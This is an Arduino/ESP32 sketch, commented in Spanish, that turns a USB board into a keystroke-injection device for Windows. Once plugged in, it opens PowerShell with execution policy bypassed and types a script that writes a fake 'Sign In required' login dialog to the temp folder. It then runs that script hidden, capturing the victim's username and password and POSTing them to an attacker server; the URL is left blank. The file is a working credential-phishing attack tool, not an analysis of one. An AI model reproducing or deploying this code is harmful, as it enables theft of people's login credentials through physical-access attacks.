#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void tipearSeguro(String texto) {
  for (int i = 0; i < texto.length(); i++) {
    Keyboard.write(texto[i]);
    delay(1);
  }
}

void setup() {
  USB.begin();
  Keyboard.begin();
  
  delay(4000);
  Keyboard.releaseAll();  
  delay(100);

  Keyboard.press(KEY_LEFT_GUI); 
  Keyboard.press('r');
  delay(150);
  Keyboard.releaseAll();
  delay(800); 

  tipearSeguro("powershell -NoProfile -ExecutionPolicy Bypass");
  delay(150);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(4000);

  // URL DEL SERVIDOR EN DONDE VIAJARA LA SOLICITUD POST.
  String url = "";

  // Paso 1: escribir el script en disco y ejecutarlo oculto, luego cerrar la consola
  String comando =
    "$s='Add-Type -AssemblyName System.Windows.Forms;"
    "$f=New-Object Windows.Forms.Form;$f.Text=''Sign In required'';$f.Size=''360,240'';$f.StartPosition=''CenterScreen'';"
    "$f.FormBorderStyle=[Windows.Forms.FormBorderStyle]::FixedDialog;$f.MaximizeBox=$false;$f.MinimizeBox=$false;"
    "$f.BackColor=[System.Drawing.SystemColors]::Control;"
    "$font=New-Object System.Drawing.Font(''Segoe UI'',9);$f.Font=$font;"
    "$l1=New-Object Windows.Forms.Label;$l1.Text=''User:'';$l1.Location=''25,25'';$l1.AutoSize=$true;"
    "$t1=New-Object Windows.Forms.TextBox;$t1.Location=''110,22'';$t1.Width=200;"
    "$l2=New-Object Windows.Forms.Label;$l2.Text=''Password:'';$l2.Location=''25,65'';$l2.AutoSize=$true;"
    "$t2=New-Object Windows.Forms.TextBox;$t2.Location=''110,62'';$t2.Width=200;$t2.PasswordChar=''*'';"
    "$b=New-Object Windows.Forms.Button;$b.Text=''OK'';$b.Location=''130,140'';$b.Size=''85,25'';"
    "$b.FlatStyle=[Windows.Forms.FlatStyle]::System;$b.DialogResult=[Windows.Forms.DialogResult]::OK;"
    "$f.Controls.AddRange(@($l1,$t1,$l2,$t2,$b));$f.TopMost=$true;"
    "if($f.ShowDialog() -eq [Windows.Forms.DialogResult]::OK){"
    "$payload=''User=''+$t1.Text+''&Password=''+$t2.Text;"
    "Invoke-WebRequest -Uri ''" + url + "'' -Method Post -Body $payload -UseBasicParsing;};"
    "';"
    "$p=$env:TEMP+'\\form.ps1';$s|Out-File -FilePath $p -Encoding UTF8;"
    "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File',$p -WindowStyle Hidden;"
    "exit";

  tipearSeguro(comando);
  delay(150);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {}